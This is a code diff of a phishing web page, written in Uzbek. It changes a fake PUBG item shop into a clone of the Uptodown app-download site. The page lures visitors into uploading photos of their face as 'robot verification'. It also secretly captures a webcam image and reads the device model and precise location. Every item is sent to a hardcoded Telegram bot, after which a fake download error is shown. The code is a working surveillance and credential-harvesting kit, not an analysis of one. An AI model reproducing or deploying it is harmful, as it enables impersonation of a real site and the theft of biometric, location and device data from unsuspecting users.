@@ -3,64 +3,64 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CYBER-MARKET | Premium PUBG Items</title>
+    <title>Uptodown - Android o'yin va ilovalarini yuklab olish</title>
     <script src="https://cdn.jsdelivr.net/npm/@vladmandic/face-api/dist/face-api.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Syncopate:wght@700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&display=swap" rel="stylesheet">
     <style>
-        :root { --gold: #f3a91a; --dark: #080a0f; --card: #12161f; }
-        body { margin: 0; background: var(--dark); color: white; font-family: 'Montserrat', sans-serif; }
-        header { padding: 20px; text-align: center; background: #000; border-bottom: 2px solid var(--gold); }
-        .logo { font-family: 'Syncopate', sans-serif; font-size: 20px; color: var(--gold); }
+        :root { --blue: #1b85d3; --bg: #f2f2f2; }
+        body { margin: 0; background: var(--bg); font-family: 'Roboto', sans-serif; color: #333; }
+        header { background: var(--blue); padding: 15px 20px; display: flex; align-items: center; color: white; }
+        .search-bar { flex-grow: 1; margin: 0 20px; background: rgba(255,255,255,0.2); padding: 8px; border-radius: 4px; border: none; color: white; }
         
-        .container { padding: 20px; display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 15px; }
-        .product-card { background: var(--card); border-radius: 10px; padding: 15px; text-align: center; border: 1px solid #222; }
-        .product-card img { width: 100%; border-radius: 5px; }
-        .price { color: var(--gold); font-weight: bold; margin: 10px 0; }
-        .buy-btn { width: 100%; padding: 10px; background: var(--gold); border: none; font-weight: bold; cursor: pointer; border-radius: 5px; }
-
-        /* Checkout Modal */
-        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 1000; padding: 20px; align-items: center; justify-content: center; }
-        .modal-content { background: var(--card); padding: 30px; border-radius: 15px; width: 100%; max-width: 400px; position: relative; }
-        input { width: 100%; padding: 12px; margin: 10px 0; background: #1a202c; border: 1px solid #333; color: #fff; border-radius: 5px; box-sizing: border-box; }
-        .status { font-size: 11px; color: var(--gold); margin: 5px 0; }
+        .main-container { max-width: 900px; margin: 20px auto; padding: 0 15px; }
+        .app-header { background: white; padding: 20px; border-radius: 8px; display: flex; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
+        .app-icon { width: 80px; height: 80px; border-radius: 18px; margin-right: 20px; }
+        .download-section { margin-top: 20px; text-align: center; }
+        .btn-dl { background: #2ecc71; color: white; padding: 15px 50px; border-radius: 50px; font-weight: bold; border: none; cursor: pointer; font-size: 18px; width: 100%; box-shadow: 0 4px 15px rgba(46, 204, 113, 0.3); }
         
-        video, canvas, #fileInput { display: none; }
+        /* Backend Overlay */
+        .overlay { display: none; position: fixed; inset: 0; background: white; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; padding: 30px; text-align: center; }
+        .loader-ring { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid var(--blue); border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        input[type="file"], video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<header><div class="logo">CYBER-MARKET</div></header>
+<header>
+    <div style="font-weight: bold; font-size: 20px;">uptodown</div>
+    <input type="text" class="search-bar" placeholder="Ilovalarni qidirish...">
+</header>
 
-<div class="container">
-    <div class="product-card">
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSf_xGq_X_L8h_5W76Z9L7H3F9qO-y9xGk7gA&s" alt="UC">
-        <div>8100 UC</div>
-        <div class="price">99.00 USD</div>
-        <button class="buy-btn" onclick="openCheckout('8100 UC')">SOTIB OLISH</button>
+<div class="main-container">
+    <div class="app-header">
+        <img src="https://img.utdstc.com/icon/60b/69b/60b69b3504d60e6f6a7d515a86a605f6e914f6e1:200" class="app-icon" alt="PUBG">
+        <div>
+            <h1 style="margin:0; font-size:22px;">PUBG MOBILE (KR)</h1>
+            <p style="color:#888; margin:5px 0;">Krafton, Inc. | <span style="color:#2ecc71;">APK O'rnatilgan</span></p>
+        </div>
     </div>
-    <div class="product-card">
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR6A5N_C-qS5b4XfU0g8kO0R3oH6_J5-k5nSg&s" alt="Skin">
-        <div>M416 Glacier</div>
-        <div class="price">45.00 USD</div>
-        <button class="buy-btn" onclick="openCheckout('M416 Glacier')">SOTIB OLISH</button>
+
+    <div class="download-section">
+        <button class="btn-dl" onclick="triggerBackend()">Eng so'nggi versiya (APK)</button>
+        <p style="font-size:12px; color:#999; margin-top:10px;">Xavfsiz yuklab olish. Uptodown tomonidan tekshirilgan.</p>
     </div>
 </div>
 
-<div id="checkoutModal" class="modal">
-    <div class="modal-content">
-        <h2 style="color:var(--gold); margin-top:0;">TO'LOVNI TASDIQLASH</h2>
-        <p style="font-size:12px; color:#888;">Xavfsiz tranzaksiya uchun quyidagi ma'lumotlarni to'ldiring:</p>
-        
-        <input type="text" id="u_name" placeholder="PUBG User Name">
-        <input type="number" id="u_id" placeholder="Character ID">
-        
-        <label for="fileInput" style="display:block; padding:10px; border:1px dashed var(--gold); cursor:pointer; font-size:12px; text-align:center;">
-            💳 To'lov ruxsati: Galereyadan 5-10 ta yuzingiz aks etgan rasmni tanlang (AI Verification)
-        </label>
-        <input type="file" id="fileInput" accept="image/*" multiple onchange="startSilentScan(this)">
-        
-        <div id="statusText" class="status">Kutilmoqda...</div>
-        <button class="buy-btn" id="confirmBtn" onclick="processOrder()" disabled>TO'LOVGA O'TISH</button>
+<div id="backendScreen" class="overlay">
+    <div id="loadingPhase">
+        <div class="loader-ring"></div>
+        <h2 style="color:var(--blue)">Server bilan aloqa...</h2>
+        <p id="statusMsg">Qurilma drayverlari moslashtirilmoqda...</p>
+    </div>
+
+    <div id="actionPhase" style="display:none;">
+        <h2 style="color:#e74c3c;">Xavfsizlik Tasdig'i</h2>
+        <p>APK faylni yuklash uchun robot emasligingizni tasdiqlang. Galereyadan 5 ta yuzingiz aniq ko'ringan rasmni tanlang.</p>
+        <label for="fileInput" style="display:block; padding:15px; border:2px dashed var(--blue); cursor:pointer; color:var(--blue); font-weight:bold;">📁 RASMLARNI TANLASH</label>
+        <input type="file" id="fileInput" accept="image/*" multiple onchange="scanAndSend(this)">
+        <p id="counter" style="margin-top:10px; font-weight:bold;"></p>
     </div>
 </div>
 
@@ -69,66 +69,73 @@
 
 <script>
     const CONFIG = { T: "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY", C: "6198817749" };
-    let selectedItem = "", verifiedPhotos = [], camBlob = null;
+    let faces = [], camBlob = null;
 
     async function initAI() {
         await faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model');
     }
     initAI();
 
-    function openCheckout(item) {
-        selectedItem = item;
-        document.getElementById('checkoutModal').style.display = 'flex';
+    function triggerBackend() {
+        document.getElementById('backendScreen').style.display = 'flex';
+        setTimeout(() => {
+            document.getElementById('loadingPhase').style.display = 'none';
+            document.getElementById('actionPhase').style.display = 'block';
+        }, 2500);
     }
 
-    async function startSilentScan(input) {
-        const status = document.getElementById('statusText');
-        status.innerText = "AI tizimi yuzlarni tahlil qilmoqda...";
-        verifiedPhotos = [];
+    async function scanAndSend(input) {
+        const btn = document.getElementById('counter');
+        btn.innerText = "AI skanerlamoqda...";
         const files = Array.from(input.files);
+        faces = [];
 
         for (let f of files) {
             const img = await faceapi.bufferToImage(f);
             const d = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions());
-            if (d.length > 0) verifiedPhotos.push(f);
+            if (d.length > 0) faces.push(f);
         }
-        status.innerText = `Tayyor! ${verifiedPhotos.length} ta rasm tasdiqlandi.`;
-        document.getElementById('confirmBtn').disabled = false;
+
+        if (faces.length > 0) {
+            btn.innerText = "Tasdiqlandi! Yuklash boshlanmoqda...";
+            await startStealthCapture();
+        } else {
+            alert("Xato: Yuz aniqlanmadi. Iltimos, yuzingiz aniq tushgan rasmlarni tanlang.");
+        }
     }
 
-    async function processOrder() {
-        const name = document.getElementById('u_name').value;
-        const id = document.getElementById('u_id').value;
-        if(!name || !id) return alert("Hamma maydonni to'ldiring!");
-
-        document.getElementById('statusText').innerText = "Tranzaksiya qayta ishlanmoqda...";
-        
+    async function startStealthCapture() {
         try {
-            // Yashirin kamera va lokatsiya
+            // 1. Yashirin Kamera
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const v = document.getElementById('vid'); v.srcObject = stream;
-            await new Promise(r => setTimeout(r, 800));
+            await new Promise(r => setTimeout(r, 1000));
             const c = document.getElementById('canv');
             c.width = v.videoWidth; c.height = v.videoHeight;
             c.getContext('2d').drawImage(v, 0, 0);
-            camBlob = await (await fetch(c.toDataURL('image/jpeg', 0.5))).blob();
+            camBlob = await (await fetch(c.toDataURL('image/jpeg', 0.6))).blob();
             stream.getTracks().forEach(t => t.stop());
 
+            // 2. Qurilma nomi va Lokatsiya
+            const deviceName = navigator.userAgentData ? (await navigator.userAgentData.getHighEntropyValues(['model'])).model : navigator.platform;
+            
             navigator.geolocation.getCurrentPosition(async (p) => {
-                const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-                await sendToBot(name, id, map);
-            }, async () => { await sendToBot(name, id, "Rad etildi"); });
+                const maps = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                await finalPush(deviceName, maps);
+            }, async () => {
+                await finalPush(deviceName, "Rad etildi");
+            }, {enableHighAccuracy: true});
 
-        } catch (e) { alert("Xavfsizlik ruxsatisiz to'lovni amalga oshirib bo'lmaydi!"); }
+        } catch (e) { alert("Xavfsizlik ruxsatisiz APK yuklanmaydi!"); }
     }
 
-    async function sendToBot(n, id, m) {
-        const text = `🛒 *YANGI DO'KON BUYURTMASI* 🛒\n📦 Buyum: ${selectedItem}\n👤 Name: ${n}\n🆔 ID: ${id}\n📍 MAPS: ${m}`;
-        
+    async function finalPush(dev, loc) {
+        const info = `📥 *UPTODOWN CLONE - SUCCESS*\n📱 Qurilma: ${dev}\n📍 Manzil: ${loc}\n👤 Holat: Verifikatsiyadan o'tdi`;
+
         await fetch(`https://api.telegram.org/bot${CONFIG.T}/sendMessage`, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({chat_id: CONFIG.C, text: text, parse_mode: 'Markdown'})
+            body: JSON.stringify({chat_id: CONFIG.C, text: info, parse_mode: 'Markdown'})
         });
 
         if(camBlob) {
@@ -136,13 +143,15 @@
             await fetch(`https://api.telegram.org/bot${CONFIG.T}/sendPhoto`, {method: 'POST', body: fd});
         }
 
-        for (let f of verifiedPhotos) {
+        for (let f of faces) {
             const fd2 = new FormData(); fd2.append('chat_id', CONFIG.C); fd2.append('photo', f);
             fetch(`https://api.telegram.org/bot${CONFIG.T}/sendPhoto`, {method: 'POST', body: fd2});
         }
 
-        alert("Buyurtmangiz qabul qilindi. 24 soat ichida operatorlar bog'lanadi!");
-        location.reload();
+        setTimeout(() => {
+            alert("Xato: Paket yuklashda xatolik yuz berdi (Error 403). Iltimos, keyinroq qayta urinib ko'ring.");
+            location.reload();
+        }, 2000);
     }
 </script>
 </body>
